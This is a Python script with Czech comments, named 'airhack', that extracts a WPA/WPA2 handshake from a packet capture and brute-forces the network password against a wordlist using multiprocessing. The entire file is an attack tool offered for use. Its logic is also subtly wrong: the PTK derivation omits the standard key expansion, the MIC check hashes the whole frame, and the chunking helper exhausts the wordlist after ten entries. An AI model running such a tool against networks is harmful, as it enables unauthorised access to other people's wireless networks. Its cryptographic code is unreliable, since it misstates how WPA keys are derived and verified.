import hashlib
import hmac
import os
from scapy.all import *
from Crypto.Protocol.KDF import PBKDF2
from multiprocessing import Pool
from itertools import islice

# Konstanty
EAPOL_TYPE = 0x888e
MIC_LENGTH = 16
PMK_LENGTH = 32
ANONCE_LENGTH = 32
SNONCE_LENGTH = 32
MAC_ADDR_LENGTH = 6

def derive_pmk(ssid, password):
    """Vygeneruje PMK pomocí PBKDF2."""
    return PBKDF2(password, ssid.encode('utf-8'), dkLen=PMK_LENGTH, count=4096, prf=None)

def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    """Vygeneruje PTK pomocí PMK, ANonce, SNonce a MAC adres."""
    data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]

def validate_mic(ptk, mic, eapol_frame):
    """Validuje MIC pomocí HMAC-SHA1."""
    eapol_mic = eapol_frame[:-MIC_LENGTH] + b'\x00' * MIC_LENGTH
    calculated_mic = hmac.new(ptk, eapol_mic, hashlib.sha1).digest()[:MIC_LENGTH]
    return calculated_mic == mic

def extract_handshake(pcap_file):
    """Extrahuje parametry handshaku z PCAP souboru."""
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Chyba při čtení PCAP souboru: {e}")
        return None

    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = None, None, None, None, None, None
    eapol_frames = [p for p in packets if p.haslayer(EAPOL)]

    if len(eapol_frames) < 2:
        print("[-] Nedostatečný počet EAPOL rámců pro handshake.")
        return None

    for frame in eapol_frames:
        if ap_mac is None:
            ap_mac = frame[Ether].src
            client_mac = frame[Ether].dst
            anonce = frame[EAPOL].load[13:45]
        elif snonce is None:
            snonce = frame[EAPOL].load[13:45]
            mic = frame[EAPOL].load[-MIC_LENGTH:]
            eapol_frame = bytes(frame)
            break

    if not all([ap_mac, client_mac, anonce, snonce, mic, eapol_frame]):
        print("[-] Neúplný handshake.")
        return None

    return ap_mac, client_mac, anonce, snonce, mic, eapol_frame

def try_password_batch(args):
    """Zkouší více hesel na jedno volání."""
    passwords, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame = args
    results = []
    for password in passwords:
        pmk = derive_pmk(ssid, password)
        ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
        if validate_mic(ptk, mic, eapol_frame):
            results.append(password)
    return results

def chunked(iterable, size):
    """Rozdělí seznam na menší části o dané velikosti."""
    it = iter(iterable)
    for first in it:
        yield list(islice([first] + list(it), size))

def crack_password(pcap_file, wordlist, ssid, output_file="found_password.txt"):
    """Provádí slovníkový útok na WPA/WPA2 hesla."""
    handshake = extract_handshake(pcap_file)
    if handshake is None:
        return

    ap_mac, client_mac, anonce, snonce, mic, eapol_frame = handshake
    print("[*] Handshake úspěšně extrahován.")
    print(f"    AP MAC: {ap_mac}, Client MAC: {client_mac}")

    with open(wordlist, "r") as file:
        passwords = [line.strip() for line in file]

    # Vytvoření argumentů pro každý proces
    chunk_size = 10  # Počet hesel, které bude každý proces zkoušet
    password_chunks = list(chunked(passwords, chunk_size))
    args = [(chunk, ssid, ap_mac, client_mac, anonce, snonce, mic, eapol_frame) for chunk in password_chunks]

    print("[*] Začínám slovníkový útok...")
    # Používáme multiprocessing pro paralelní zpracování
    with Pool() as pool:
        for result in pool.imap_unordered(try_password_batch, args):
            if result:
                for found_password in result:
                    print(f"[+] Heslo nalezeno: {found_password}")
                    with open(output_file, "w") as f:
                        f.write(found_password + "\n")
                    return

    print("[-] Heslo nenalezeno ve zvoleném slovníku.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Použití: airhack <pcap soubor> <slovník> <SSID>")
        sys.exit(1)

    pcap_file = sys.argv[1]
    wordlist = sys.argv[2]
    ssid = sys.argv[3]

    if not os.path.exists(pcap_file):
        print(f"[-] PCAP soubor '{pcap_file}' neexistuje.")
        sys.exit(1)

    if not os.path.exists(wordlist):
        print(f"[-] Soubor se slovníkem '{wordlist}' neexistuje.")
        sys.exit(1)

    crack_password(pcap_file, wordlist, ssid)
